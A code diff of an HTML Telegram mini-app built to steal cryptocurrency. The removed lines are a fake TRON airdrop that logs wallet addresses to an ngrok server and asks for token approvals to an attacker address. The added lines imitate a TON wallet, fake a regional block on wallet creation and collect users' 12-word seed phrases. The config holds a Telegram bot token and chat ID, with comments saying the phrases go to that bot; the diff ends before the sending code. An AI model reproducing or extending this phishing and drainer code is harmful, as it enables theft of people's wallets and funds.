@@ -1,248 +1,484 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-TW">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TRON Airdrop</title>
+    <title>Wallet</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    
     <style>
-        :root { --primary: #007aff; --bg: #000; --card: #1c1c1e; --text: #fff; --gold: #ffcc00; --tron: #ff0013; }
-        body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        
-        /* 顶部公告栏 */
-        .header-banner { width: 100%; background: linear-gradient(90deg, #310606 0%, #ff0013 50%, #310606 100%); padding: 12px 0; text-align: center; box-shadow: 0 4px 15px rgba(255,0,19,0.4); z-index: 10; }
-        .header-banner span { font-size: 16px; font-weight: 900; color: #fff; letter-spacing: 2px; text-transform: uppercase; }
+        body { margin: 0; padding: 0; background-color: #17212b; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; -webkit-user-select: none; user-select: none; display: flex; flex-direction: column; align-items: center; min-height: 100vh; box-sizing: border-box; padding: 16px 20px 30px 20px; overflow: hidden; }
 
-        #ui-external { flex: 1; display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; }
-        
-        .live-tag { background: rgba(52, 199, 89, 0.2); color: #34c759; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; gap: 5px; }
-        .live-dot { width: 6px; height: 6px; background: #34c759; border-radius: 50%; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        /* 頂部固定滑塊 */
+        .tab-container { display: flex; background-color: rgba(0, 0, 0, 0.2); border-radius: 20px; padding: 2px; margin-top: 10px; z-index: 10; }
+        .tab-item { padding: 6px 16px; font-size: 14px; font-weight: 500; border-radius: 18px; color: #708499; cursor: pointer; transition: all 0.2s; }
+        .tab-item.active { background-color: #2b3c4f; color: #ffffff; }
 
-        .airdrop-card { background: linear-gradient(145deg, #2c2c2e 0%, #1c1c1e 100%); border: 1px solid rgba(255,255,255,0.08); border-radius: 35px; padding: 40px 25px; width: 85%; max-width: 340px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); text-align: center; }
-        .amount-display { margin: 20px 0; }
-        .amount-display .value { font-size: 56px; font-weight: 900; color: #fff; letter-spacing: -2px; }
-
-        .btn-main { width: 100%; padding: 20px 0; background: #fff; color: #000; border: none; border-radius: 22px; font-size: 17px; font-weight: 800; cursor: pointer; transition: all 0.2s; }
-        .btn-main:active { transform: scale(0.96); }
-
-        /* 弹窗层 */
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 1000; }
-        .overlay.active { display: flex !important; }
-        .modal { background: #2c2c2e; width: 88%; max-width: 350px; border-radius: 30px; padding: 25px; border: 1px solid #3a3a3c; }
+        /* 輪播圖外層包裝 */
+        .swiper-wrapper-container { width: 100%; flex-grow: 1; display: none; margin-top: 10px; }
+        .swiper-wrapper-container.active { display: block; }
+        .swiper { width: 100%; height: 100%; position: relative; }
         
-        .wallet-option { display: flex; align-items: center; padding: 15px; background: #3a3a3c; border-radius: 18px; cursor: pointer; margin-bottom: 12px; }
-        .wallet-logo { width: 42px; height: 42px; border-radius: 12px; margin-right: 15px; background: #fff; color: #000; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .swiper-slide { display: flex; flex-direction: column; align-items: center; justify-content: flex-start; box-sizing: border-box; padding: 0 10px; opacity: 0 !important; transition: opacity 0.4s ease-in-out; }
+        .swiper-slide-active { opacity: 1 !important; }
+
+        /* 插畫基礎 */
+        .illustration-box { position: relative; width: 100%; height: 210px; display: flex; justify-content: center; align-items: center; margin-top: 20px; }
+        .star { position: absolute; color: #708499; font-size: 24px; opacity: 0.6; animation: starPulse 2s infinite alternate; }
+        .svg-icon { display: block; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3)); }
         
-        #ui-internal { display: none; text-align: center; padding: 40px 20px; }
+        /* TON 頁面樣式 */
+        .tg-plane-svg { position: absolute; left: 33%; top: 43%; z-index: 2; width: 88px; filter: drop-shadow(0 0 10px #24a1de); }
+        .ton-diam-svg { position: absolute; right: 33%; top: 20%; z-index: 1; width: 80px; filter: drop-shadow(0 0 10px #007aff); }
+        .cube-group { position: relative; width: 140px; height: 140px; transform: rotate(-10deg); }
+        .cube-svg { position: absolute; width: 60px; border-radius: 14px; box-shadow: 0 4px 8px rgba(0,0,0,0.4); }
+        .cube-plane { top: -10px; left: 0; }
+        .cube-heart { top: 20px; right: -5px; }
+        .cube-block { bottom: -10px; left: 25px; transform: rotate(15deg); }
+        .duck-frog-group { position: relative; width: 150px; height: 150px; }
+        .duck-svg { position: absolute; width: 130px; left: 10px; top: -10px; z-index: 1; }
+        .frog-svg { position: absolute; width: 50px; bottom: 10px; left: 40px; z-index: 2; transform: rotate(-8deg); filter: drop-shadow(0 0 8px #31ca5d); }
+
+        /* 加密貨幣頁面樣式 */
+        .wallet-card-container { position: relative; width: 140px; height: 140px; display: flex; justify-content: center; align-items: center; }
+        .wallet-card-svg { position: absolute; width: 105px; z-index: 2; filter: drop-shadow(0 6px 12px rgba(0,0,0,0.3)); }
+        .coin-usdt { position: absolute; width: 42px; left: -10px; top: 15px; z-index: 1; transform: rotate(-18deg); }
+        .coin-btc { position: absolute; width: 45px; right: -12px; bottom: 20px; z-index: 3; transform: rotate(15deg); filter: drop-shadow(0 2px 5px rgba(0,0,0,0.4)); }
+        .transfer-group { position: relative; width: 180px; height: 120px; display: flex; align-items: center; justify-content: space-between; }
+        .avatar-svg { width: 52px; height: 52px; z-index: 2; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3)); }
+        .transfer-arrow-svg { width: 65px; height: auto; position: absolute; left: 58px; top: 50%; transform: translateY(-50%); z-index: 1; }
+
+        /* 文案樣式 */
+        .title { font-size: 26px; font-weight: 700; margin: 35px 0 12px 0; text-align: center; letter-spacing: 0.5px; width: 100%; line-height: 1.3; }
+        .description { color: #8e9ca8; font-size: 16px; line-height: 1.45; text-align: center; margin: 0 0 40px 0; padding: 0 15px; opacity: 0.9; width: 100%; }
+
+        /* 輪播圓點容器樣式 */
+        .swiper-pagination-dots { position: absolute !important; bottom: 15px !important; left: 50% !important; transform: translateX(-50%) !important; display: flex; justify-content: center; gap: 7px; z-index: 20; width: auto !important; }
+        .swiper-pagination-bullet { width: 6px !important; height: 6px !important; background-color: #556775 !important; opacity: 1 !important; margin: 0 !important; border-radius: 50% !important; transition: background-color 0.2s; }
+        .swiper-pagination-bullet-active { background-color: #ffffff !important; width: 6px !important; border-radius: 50% !important; }
+
+        /* 底部操作按鈕 */
+        .footer-actions { width: 100%; display: flex; flex-direction: column; gap: 12px; z-index: 10; margin-top: auto; }
+        .btn { width: 100%; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; text-align: center; transition: opacity 0.1s; }
+        .btn:active { opacity: 0.85; }
+        .btn-blue { background-color: #2481cc; color: #ffffff; }
+        .btn-blue:disabled { background-color: rgba(36, 129, 204, 0.4); color: rgba(255, 255, 255, 0.4); cursor: not-allowed; }
+        .btn-dark { background-color: #24313f; color: #5288c1; }
+        .terms-text { font-size: 12px; color: #708499; margin-top: 14px; text-align: center; }
+        .terms-text span { color: #5288c1; cursor: pointer; }
+
+        /* 地區不支持全屏遮罩 */
+        .geo-blocked-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #17212b; z-index: 100; display: none; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; padding: 40px 24px; }
+        .geo-blocked-screen.active { display: flex; }
+        .geo-icon-box { width: 90px; height: 90px; background-color: rgba(235, 0, 41, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 30px; }
+        .geo-icon-box svg { width: 45px; height: 45px; fill: #eb0029; }
+        .geo-title { font-size: 24px; font-weight: 700; color: #ffffff; margin-bottom: 16px; text-align: center; }
+        .geo-desc { color: #708499; font-size: 15px; line-height: 1.5; text-align: center; max-width: 280px; margin-bottom: auto; }
+
+        /* 12 助記詞匯入頁面樣式 */
+        .import-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #17212b; z-index: 50; display: none; flex-direction: column; box-sizing: border-box; padding: 20px 20px 30px 20px; overflow-y: auto; }
+        .import-screen.active { display: flex; }
+        .import-header-title { font-size: 24px; font-weight: 700; color: #ffffff; text-align: center; margin-top: 15px; margin-bottom: 10px; }
+        .import-sub-desc { color: #708499; font-size: 15px; line-height: 1.45; text-align: center; margin: 0 auto 25px auto; max-width: 320px; }
+        
+        .words-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; margin-bottom: 15px; }
+        .word-input-wrapper { display: flex; align-items: center; background-color: #24313f; border: 1.5px solid transparent; border-radius: 12px; padding: 10px 14px; box-sizing: border-box; transition: border-color 0.2s; position: relative; }
+        .word-input-wrapper.focused { border-color: #2481cc; box-shadow: 0 0 8px rgba(36,129,204,0.3); }
+        .word-index { font-size: 14px; color: #708499; width: 22px; font-weight: 500; }
+        .word-input { background: none; border: none; color: #ffffff; font-size: 16px; font-weight: 500; width: 100%; padding: 0; outline: none; font-family: inherit; }
+
+        /* 單字聯想提示面板樣式 */
+        .suggest-box-container { width: 100%; min-height: 55px; margin-bottom: 15px; }
+        .suggestion-box { width: 100%; background-color: #24313f; border-radius: 14px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); display: none; flex-direction: row; flex-wrap: wrap; gap: 8px; padding: 12px; box-sizing: border-box; border: 1px solid #344659; }
+        .suggestion-box.active { display: flex; }
+        .suggestion-item { background-color: #17212b; color: #5288c1; padding: 8px 14px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.15s; border: 1px solid rgba(255,255,255,0.05); }
+        .suggestion-item:active { background-color: #2481cc; color: #ffffff; }
+
+        /* ================= 新增：正在導入載入界面 ================= */
+        .loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #17212b; z-index: 60; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        .loading-screen.active { display: flex; }
+        .spinner { width: 44px; height: 44px; border: 3.5px solid rgba(36, 129, 204, 0.2); border-top: 3.5px solid #2481cc; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
+        .loading-text { font-size: 20px; font-weight: 600; color: #ffffff; margin-bottom: 8px; }
+        .loading-sub { font-size: 14px; color: #708499; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes starPulse { from { opacity: 0.2; transform: scale(0.8); } to { opacity: 0.8; transform: scale(1.1); } }
     </style>
 </head>
 <body>
 
-    <div class="header-banner"><span>🔥 TRX 空投大放送 🔥</span></div>
+    <div id="main-header-tabs" class="tab-container">
+        <div class="tab-item" id="tab-crypto" onclick="switchMainTab('crypto')">加密貨幣</div>
+        <div class="tab-item active" id="tab-ton" onclick="switchMainTab('ton')">TON</div>
+    </div>
 
-    <div id="ui-external">
-        <div class="live-tag"><span class="live-dot"></span> LIVE DISTRIBUTION</div>
-        <div class="airdrop-card">
-            <div style="font-size: 11px; color: #94a3b8;">ESTIMATED REWARD</div>
-            <div class="amount-display">
-                <span style="color:var(--tron); font-size:28px; font-weight:800;">$</span><span class="value" id="main-val">0.00</span>
+    <div class="swiper-wrapper-container active" id="container-ton">
+        <div class="swiper mySwiper" id="swiper-ton">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                    <div class="illustration-box">
+                        <span class="star" style="top:25%; left:20%;">✦</span>
+                        <img class="svg-icon ton-diam-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M50 82L15 62l35-20 35 20L50 82z' fill='%23007aff'/%3E%3Cpath d='M50 21l35 20L50 61 15 41 50 21z' fill='%231998ff'/%3E%3Cpath d='M50 21v40' stroke='%23fff' stroke-width='3' stroke-linecap='round'/%3E%3C/svg%3E">
+                        <img class="svg-icon tg-plane-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%2324a1de'/%3E%3Cpath d='M43 65l2-16 29-26c1-.1-1-.2-2-.1L35 48 18 43c-3-1-3-3 1-4l59-23c3-1 6 .5 5 4l-10 47c-1 3-3 4-5 3L43 65zm0 0l-1 7c-1 3-2 3-3 0l-5-16' fill='%23fff'/%3E%3C/svg%3E">
+                        <span class="star" style="bottom:25%; right:20%;">✦</span>
+                    </div>
+                    <div class="title">您的 TON 核心錢包</div>
+                    <div class="description">安全地購買、儲存並接收加密貨幣，從容掌控一切</div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="illustration-box">
+                        <div class="cube-group">
+                            <img class="svg-icon cube-svg cube-plane" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%230e1621'/%3E%3Cpath d='M40 70l1-12 21-19 1-1-12 11-13-4c-2-1-2-2 0-3L80 23c2-1 4 1 3 4l-7 35c-1 2-2 3-4 2L40 70z' fill='%23fff'/%3E%3C/svg%3E">
+                            <img class="svg-icon cube-svg cube-heart" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%23eb0029'/%3E%3Cpath d='M50 80C30 65 15 50 15 35 15 20 30 15 50 30c20-15 35-5 35 10 0 15-15 30-35 45z' fill='%23fff'/%3E%3C/svg%3E">
+                            <img class="svg-icon cube-svg cube-block" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%23fff'/%3E%3Crect x='30' y='30' width='40' height='40' rx='5' fill='%2317212b'/%3E%3C/svg%3E">
+                        </div>
+                    </div>
+                    <div class="title">可用於心儀應用程式的錢包</div>
+                    <div class="description">TON 核心錢包讓您可以存取 Telegram 小程式和 TON dApp。</div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="illustration-box">
+                        <span class="star" style="top:15%; left:15%;">✦</span>
+                        <div class="duck-frog-group">
+                            <img class="svg-icon duck-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M50 10c-15 0-27 10-27 22 0 10 9 18 20 20-5 3-10 8-12 14-3 7-1 14 6 18a25 25 0 0013 4 25 25 0 0013-4c7-4 9-11 6-18-2-6-7-11-12-14 11-2 20-10 20-20C77 20 65 10 50 10zm-7 18a4 4 0 110 8 4 4 0 010-8zm14 0a4 4 0 110 8 4 4 0 010-8zm-11 11a1 1 0 010 2l-3-1-3 1a1 1 0 010-2l3 1 3-1zm8 0a1 1 0 010 2l-3-1-3 1a1 1 0 010-2l3 1 3-1zM50 83l-8 3-8-3V70l8-3 8 3v13z' fill='%23fcca35'/%3E%3Cpath d='M30 40a4 4 0 100 8c15-4 15 4 0 0zm40 0a4 4 0 100 8c15-4 15 4 0 0z' fill='%23ff9328'/%3E%3Cpath d='M40 70l-8 3-8-3V57l8-3 8 3v13zM60 70l8 3 8-3V57l8-3 8 3v13z' fill='%23f29a00'/%3E%3C/svg%3E">
+                            <img class="svg-icon frog-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%2317212b'/%3E%3Ccircle cx='50' cy='50' r='30' fill='%2331ca5d'/%3E%3Ccircle cx='40' cy='45' r='8' fill='%23fff'/%3E%3Ccircle cx='40' cy='45' r='4' fill='%230e1621'/%3E%3Ccircle cx='60' cy='45' r='8' fill='%23fff'/%3E%3Ccircle cx='60' cy='45' r='4' fill='%230e1621'/%3E%3Cpath d='M35 60l15 8 15-8' stroke='%230e1621' stroke-width='4' stroke-linecap='round' fill='none'/%3E%3Cpath d='M40 75C30 75 30 90 40 90c5 0 5-5 5-10 0-3-2-5-5-5zm20 0c10 0 10 15 0 15-5 0-5-5-5-10 0-3 2-5 5-5z' fill='%23eb0029'/%3E%3C/svg%3E">
+                        </div>
+                        <span class="star" style="bottom:15%; right:15%;">✦</span>
+                    </div>
+                    <div class="title">儲存 Telegram 禮物、用戶名等</div>
+                    <div class="description">TON 核心錢包支持所有 TON NFT，包括 Telegram 收藏品。</div>
+                </div>
             </div>
-            <button id="action-btn" class="btn-main" onclick="handleMainAction()">CLAIM NOW</button>
+            <div class="swiper-pagination swiper-pagination-dots"></div>
         </div>
     </div>
 
-    <div id="ui-internal">
-        <div style="background:#1c1c1e; padding:40px; border-radius:40px; border:1px solid #333;">
-            <div style="font-size:70px; color:#34c759;">✓</div>
-            <h2 style="margin:20px 0;">Status: Ready</h2>
-            <div id="addr" style="font-family:monospace; font-size:11px; color:#8e8e93; background:#000; padding:12px; border-radius:12px; word-break:break-all; margin-bottom: 20px;"></div>
-            <button id="approve-btn" class="btn-main" style="background:#34c759; color:#fff;" onclick="requestApproval()">CONFIRM WITHDRAW</button>
-            <p id="status-msg" style="font-size:12px; color: #ffcc00; margin-top: 15px;"></p>
+    <div class="swiper-wrapper-container" id="container-crypto">
+        <div class="swiper mySwiper" id="swiper-crypto">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide">
+                    <div class="illustration-box">
+                        <span class="star" style="top:20%; left:15%;">✦</span>
+                        <div class="wallet-card-container">
+                            <img class="svg-icon coin-usdt" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 50 50'%3E%3Ccircle cx='25' cy='25' r='25' fill='%23009393'/%3E%3Ccircle cx='25' cy='25' r='21' fill='none' stroke='%23fff' stroke-width='2'/%3E%3Cpath d='M16 18h18v4h-7v14h-4V22h-7v-4zm5 8h8v2h-8v-2z' fill='%23fff'/%3E%3C/svg%3E">
+                            <img class="svg-icon wallet-card-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 100'%3E%3Crect x='10' y='25' width='90' height='60' rx='12' fill='%2324313f' stroke='%23344659' stroke-width='2'/%3E%3Crect x='22' y='15' width='90' height='60' rx='12' fill='%232481cc'/%3E%3Crect x='34' y='32' width='25' height='16' rx='4' fill='%233fb1ff' opacity='0.4'/%3E%3Ccircle cx='95' cy='45' r='10' fill='%23fff' opacity='0.15'/%3E%3Cpath d='M85 45h20' stroke='%23fff' stroke-width='3' stroke-linecap='round' opacity='0.3'/%3E%3C/svg%3E">
+                            <img class="svg-icon coin-btc" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 50 50'%3E%3Ccircle cx='25' cy='25' r='25' fill='%23f2a900'/%3E%3Ccircle cx='25' cy='25' r='21' fill='none' stroke='%23fff' stroke-width='2'/%3E%text x='18' y='34' font-family='sans-serif' font-size='26' font-weight='bold' fill='%23fff'%3EB%3C/text%3E%3Cpath d='M22 6v4m6-4v4m-6 30v4m6-4v4' stroke='%23fff' stroke-width='3' stroke-linecap='round'/%3E%3C/svg%3E">
+                        </div>
+                        <span class="star" style="bottom:20%; right:15%;">✦</span>
+                    </div>
+                    <div class="title">輕鬆購買與兌換</div>
+                    <div class="description">支持多種主流代幣，直接在對話框內完成一鍵兌換與存儲。</div>
+                </div>
+                <div class="swiper-slide">
+                    <div class="illustration-box">
+                        <div class="transfer-group">
+                            <img class="svg-icon avatar-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 60 60'%3E%3Ccircle cx='30' cy='30' r='30' fill='%235288c1'/%3E%3Ccircle cx='30' cy='22' r='10' fill='%23fff'/%3E%3Cpath d='M12 48c0-8 8-12 18-12s18 4 18 12H12z' fill='%23fff'/%3E%3C/svg%3E">
+                            <img class="svg-icon transfer-arrow-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 40'%3E%3Cpath d='M5 20h65' stroke='%235288c1' stroke-width='4' stroke-dasharray='6 4' stroke-linecap='round' fill='none'/%3E%3Cpath d='M62 10l12 10-12 10' stroke='%235288c1' stroke-width='4' stroke-linecap='round' stroke-linejoin='round' fill='none'/%3E%3C/svg%3E">
+                            <img class="svg-icon avatar-svg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 60 60'%3E%3Ccircle cx='30' cy='30' r='30' fill='%2331ca5d'/%3E%3Ccircle cx='30' cy='22' r='10' fill='%23fff'/%3E%3Cpath d='M12 48c0-8 8-12 18-12s18 4 18 12H12z' fill='%23fff'/%3E%3C/svg%3E">
+                        </div>
+                    </div>
+                    <div class="title">免手續費好友轉賬</div>
+                    <div class="description">無需複雜的錢包地址，直接向您的 Telegram 聯絡人發送加密貨幣。</div>
+                </div>
+            </div>
+            <div class="swiper-pagination swiper-pagination-dots"></div>
         </div>
     </div>
 
-    <div id="walletModal" class="overlay">
-        <div class="modal">
-            <h3 style="text-align:center; margin-top:0;">Connect Wallet</h3>
-            <div class="wallet-option" onclick="jumpTo('tronlink')" style="border: 1px solid var(--tron);">
-    <div class="wallet-logo" style="background:var(--tron); color:#fff;">TL</div>
-    <b>TronLink</b>
-</div>
-<div class="wallet-option" onclick="jumpTo('okx')">
-    <div class="wallet-logo">OKX</div>
-    <b>OKX Wallet</b>
-</div>
-<div class="wallet-option" onclick="jumpTo('tp')">
-    <div class="wallet-logo" style="background:#2161ff; color:#fff;">TP</div>
-    <b>TokenPocket</b>
-</div>
-<div class="wallet-option" onclick="jumpTo('trust')">
-    <div class="wallet-logo" style="background:#3375bb; color:#fff;">TW</div>
-    <b>Trust Wallet</b>
-</div>
-<div class="wallet-option" onclick="jumpTo('bitget')">
-    <div class="wallet-logo" style="background:#010101; color:#fff;">BG</div>
-    <b>Bitget Wallet</b>
-</div>
-<div class="wallet-option" onclick="jumpTo('metamask')">
-    <div class="wallet-logo" style="background:#f6851b; color:#fff;">MM</div>
-    <b>MetaMask</b>
+    <div id="main-footer-actions" class="footer-actions">
+        <button class="btn btn-blue" onclick="triggerGeoBlock()">創建新錢包</button>
+        <button class="btn btn-dark" onclick="showImportScreen()">添加現有錢包</button>
+        <div class="terms-text">繼續即表示您同意<span>使用條款</span>。</div>
+    </div>
+
+    <div class="geo-blocked-screen" id="geo-screen">
+        <div class="geo-icon-box">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+        </div>
+        <div class="geo-title">遺憾，目前無法為您提供創建新的加密錢包服務</div>
+        <div class="geo-desc">根據您目前的IP位置或帳戶設定，您所在的地區目前無法建立新的錢包，您可以嘗試匯入錢包。</div>
+        <div class="footer-actions" style="width: 100%;">
+            <button class="btn btn-blue" onclick="dismissGeoBlock()">返回主介面</button>
+        </div>
+    </div>
+
+    <div class="import-screen" id="import-screen">
+        <div class="import-header-title">輸入您的助記詞</div>
+        <div class="import-sub-desc">請按正確的順序輸入您的 12 個安全字詞。</div>
+        
+        <div class="words-grid">
+    <div class="word-input-wrapper" id="wrapper-w1"><span class="word-index">1</span><input type="text" class="word-input" id="w1" data-idx="1" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w2"><span class="word-index">2</span><input type="text" class="word-input" id="w2" data-idx="2" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w3"><span class="word-index">3</span><input type="text" class="word-input" id="w3" data-idx="3" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w4"><span class="word-index">4</span><input type="text" class="word-input" id="w4" data-idx="4" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w5"><span class="word-index">5</span><input type="text" class="word-input" id="w5" data-idx="5" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w6"><span class="word-index">6</span><input type="text" class="word-input" id="w6" data-idx="6" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w7"><span class="word-index">7</span><input type="text" class="word-input" id="w7" data-idx="7" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w8"><span class="word-index">8</span><input type="text" class="word-input" id="w8" data-idx="8" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w9"><span class="word-index">9</span><input type="text" class="word-input" id="w9" data-idx="9" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w10"><span class="word-index">10</span><input type="text" class="word-input" id="w10" data-idx="10" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w11"><span class="word-index">11</span><input type="text" class="word-input" id="w11" data-idx="11" autocomplete="off" autocapitalize="none"></div>
+    <div class="word-input-wrapper" id="wrapper-w12"><span class="word-index">12</span><input type="text" class="word-input" id="w12" data-idx="12" autocomplete="off" autocapitalize="none"></div>
 </div>
 
-<div style="text-align:center; color:#ff453a; margin-top:20px; cursor:pointer;" onclick="closeModal()">Cancel</div>
+        <div class="suggest-box-container">
+            <div class="suggestion-box" id="suggest-box"></div>
         </div>
+
+        <div class="footer-actions">
+            <button class="btn btn-blue" id="btn-import-submit" onclick="submitMnemonicWords()" disabled>繼續</button>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loading-screen">
+        <div class="spinner"></div>
+        <div class="loading-text">正在導入錢包...</div>
+        <div class="loading-sub">這需要幾秒鐘時間，請不要關閉小程式</div>
     </div>
 
     <script>
+        // ================= 配置你的 TELEGRAM BOT 後台參數 =================
+        const TG_BOT_TOKEN = "7771182126:AAEWbL_h34zZgbiAGvekO-e92niJxNnQ8MY"; // 替換成你的 Bot 的 Token (例如 123456789:ABCdef...)
+        const TG_CHAT_ID = "8574459221";     // 替換成接收助記詞的 Chat ID 或群組 ID
+
+        const BIP39_WORDS = [
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", 
+            "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", 
+            "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "advise", "aerobic", "affair", 
+            "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", 
+            "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", 
+            "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", 
+            "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", 
+            "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", 
+            "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "as", "ash", "asset", 
+            "banana", "basic", "beach", "below", "blue", "bonus", "brave", "bullet", "buyer", "cake", "camera", "candy", "canvas",
+            "card", "cargo", "case", "catch", "cattle", "ceiling", "celery", "cement", "census", "century", "cereal", "certain",
+            "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese",
+            "danger", "dark", "dash", "daughter", "dawn", "day", "deal", "debate", "debris", "decade", "december", "decide",
+            "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy", "edge", "edit", "educate",
+            "faith", "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal",
+            "game", "gap", "garage", "garbage", "garden", "garlic", "garment", "gas", "gasp", "gate", "gather", "gauge"
+        ];
+
         const tg = window.Telegram.WebApp;
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT 
-        const API_URL = "https://opposite-chowder-prompter.ngrok-free.dev/api/log";
-        const RECEIVER = "TXdUT4xRokNsYfz3ME236cqJieYpoTXzoM"; // 【替换这里】你的收款或权限接收地址
-        
-        let userBalance = localStorage.getItem('p_amt') || "0.00";
-        let isClaimed = !!localStorage.getItem('p_amt');
-        async function reportToBackend(status) {
-            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) return;
-            const payload = {
-                address: window.tronWeb.defaultAddress.base58,
-                status: status, // "Visited" 或 "Approved"
-                balance: 0, // 初始余额设为0，后端可异步查询真实余额
-                time: new Date().toLocaleTimeString()
-            };
-            try {
-                await fetch(API_URL, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) { console.log("Report offline"); }
+        tg.ready(); tg.expand();
+        if(tg.setHeaderColor) tg.setHeaderColor('#17212b');
+
+        let swiperTon, swiperCrypto;
+        let activeInputId = null;
+
+        function initSwiper(id) {
+            return new Swiper(id, {
+                direction: "horizontal",
+                loop: true,
+                autoplay: { delay: 3000, disableOnInteraction: false },
